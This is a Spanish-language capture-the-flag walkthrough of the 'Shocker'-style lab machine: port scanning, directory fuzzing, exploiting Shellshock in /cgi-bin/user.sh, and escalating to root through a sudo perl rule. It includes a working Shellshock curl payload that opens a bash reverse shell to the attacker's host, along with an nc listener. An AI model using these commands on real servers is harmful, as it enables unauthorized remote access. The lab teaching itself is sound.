## Summary

Tags:  #Linux #HTTP #ShellShock #Sudoers #Fuzzing #Nmap 

- IP -> 10.10.10.56
- Ports -> TCP (80, 2222), UDP (idk)
- OS ->  Linux Ubuntu 
- Services & Applications
    - 80 -> Apache httpd 2.4.18 
    - 2222 -> OpenSSH 7.2p2 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

* 80 -> Apache httpd 2.4.18  -> Xenial 
* 2222 -> OpenSSH 7.2p2  -> Xenial

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

	#  -p80 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  -oN WebScan = Exporta el output a un fichero en formato nmap con nombre “WebScan”
```

Miramos con Whatweb
```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

Haremos fuzzing para buscar mas dir en la web. 
```bash
# Para hacer Fuzzing a la web
❯ wfuzz -c --hc=404 --hh=137 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ 

# Como no nos sale nada, debemos de colocarle la barra al final de FUZZ que seria lo mas recomendable
❯ wfuzz -c --hc=404 --hh=137 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
	# Encontramos un dir llamado 'cgi-bin'

# Este dir sale cuando tenemos un ShellShock como vulnerabilidad, por lo que haremos otro fuzzing pero con ese dir agregado a la ruta para descubrir archivos que pueden existir en ese dir cgi
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
	# Nos encuentra un "user - sh = user.sh"

```

Colocando la ruta final la cual sería: **10.10.10.56/cgi-bin/user.sh** nos permite descargar un archivo a la maquina de atacante. 

Pero en lugar de descargarlo, podemos ver lo que es con curl.
```bash 
❯ curl -s -X GET http://10.10.10.56/cgi-bin/user.sh      # Miramos el contenido del archivo, nos damos cuenta que es un archivo ejecutable dinamico
```

Cuando tenemos la carpeta cgi-bin, podemos hacer un ataque de ShellShock de la siguiente manera. 
```bash 
❯ nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56    # Ver si es vulnerable a ShellShock
```

```bash 
❯ curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; /usr/bin/whoami"  # Debemos de colocar la ruta del archivo.sh, ya que si solo colocamos /cgi-bin/ nos sladra que no tenemos permisos

	# s = Silence 
	# H = Cabecera para el ataque de ShellShock
	# Ruta absoluta del comando que quieres ejecutar y lo ves con 'which' -> which whoami

# Nos sale que el nombre del usuario es Shelly

# Podemos usar el ShellShock para ganar acceso a la maquina.
❯ curl -s -X GET http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
```

Antes de usar el comando anterior, debemos de colocarnos en escucha para recibir la revershell
```bash
❯ nc -nlvp 443 
```

## User

Una vez dentro de la maquina victima, hacemos el tratamiento de la TTL para obtner una pseudo-consola

```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

Ahora nos disponemos a buscar la flag del usuario. 

```bash
❯ lsb_release -a                             # Miramos algunas caracteristicas de la maquina Linux 
```

## Root

Para convertirnos en root buscamos en el Sudoers
```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
	
	# (ALL : ALL) ALL
	# ALL=(root) NOPASSWD: /usr/bin/perl
```

Buscamos en la siguiente pagina:
- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)

Y encontramos el comando que debemos de ejecutar para poder usar **Perl** y así convertirnos en root. Después buscamos el root.txt. 